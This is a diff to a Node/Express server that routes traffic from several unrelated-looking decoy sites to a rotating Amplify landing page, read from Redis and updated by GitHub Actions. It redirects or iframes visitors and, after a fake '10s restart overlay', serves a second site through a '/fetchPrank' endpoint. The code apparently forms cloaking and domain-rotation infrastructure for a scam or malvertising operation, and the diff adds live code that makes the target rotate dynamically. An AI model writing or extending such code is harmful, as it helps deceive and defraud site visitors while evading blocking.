@@ -48,6 +48,12 @@ const KEY_TOPUP_LOCK = "aps:topup_lock";
 const keyBatchMembers = (id) => `aps:batch:${id}:members`;
 const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`;
 
+// Key that stores the current live Amplify URL (updated by GitHub Actions)
+const KEY_AMPLIFY_URL = "amplify:current_url";
+// Hardcoded fallback used when Redis is unreachable or the key hasn't been set yet
+const AMPLIFY_URL_FALLBACK =
+  process.env.AMPLIFY_URL_FALLBACK || "https://main.d1sg22rtgy05lp.amplifyapp.com";
+
 // ─── Clients ──────────────────────────────────────────────────────
 const s3Client = new S3Client({ region: REGION });
 const s3Control = new S3ControlClient({ region: REGION });
@@ -85,18 +91,18 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairyfarmshop1.netlify.app": { method: "redirect", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
-    "https://teruogames.org": { method: "redirect", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
+    "https://naotoshidairyfarmshop1.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://takahirofarmfood.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d1sg22rtgy05lp.amplifyapp.com" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
 };
 
@@ -590,7 +596,14 @@ const BUILD_PAYLOAD_HANDLERS = {
     }
     return buildPayloadIframe(target);
   },
-  redirect: async (entry) => buildPayloadRedirect(entry.target),
+  redirect: async (entry) => {
+    let target = entry.target;
+    if (entry.redisKey) {
+      const dynamic = await getRotationTarget(entry.redisKey);
+      if (dynamic) target = dynamic;
+    }
+    return buildPayloadRedirect(target);
+  },
   s3ap: async () => {
     const presigned = await nextPresignedUrl();
     if (!presigned) return null;
@@ -667,16 +680,17 @@ app.use(express.static(path.join(__dirname, "website2"), { index: false }));
 
 // 2) The endpoint website1 calls after the 10s restart overlay.
 //    Returns website2/index.html as raw HTML, which website1 loads via iframe.srcdoc.
-app.get("/fetchPrank", (req, res) => {
-  if (!isAuthorized(req)) return res.status(403).send("Forbidden");
+app.get("/fetchPrank", async (req, res) => {
+  if (!(await isAuthorized(req))) return res.status(403).send("Forbidden");
   res.sendFile(path.join(__dirname, "website2", "index.html"));
 });
 
-function isAuthorized(req) {
-  // Replace with whatever "who is requesting" check you want.
-  // Simple Netlify-origin allowlist:
-  const allowed = ["https://main.d1sg22rtgy05lp.amplifyapp.com"];
-  return allowed.includes(req.get("origin"));
+async function isAuthorized(req) {
+  const origin = req.get("origin");
+  if (!origin) return false;
+  const current = await getRotationTarget(KEY_AMPLIFY_URL);
+  const allowed = [current || AMPLIFY_URL_FALLBACK];
+  return allowed.includes(origin);
 }
 
 app.get("/status", async (_req, res) => {
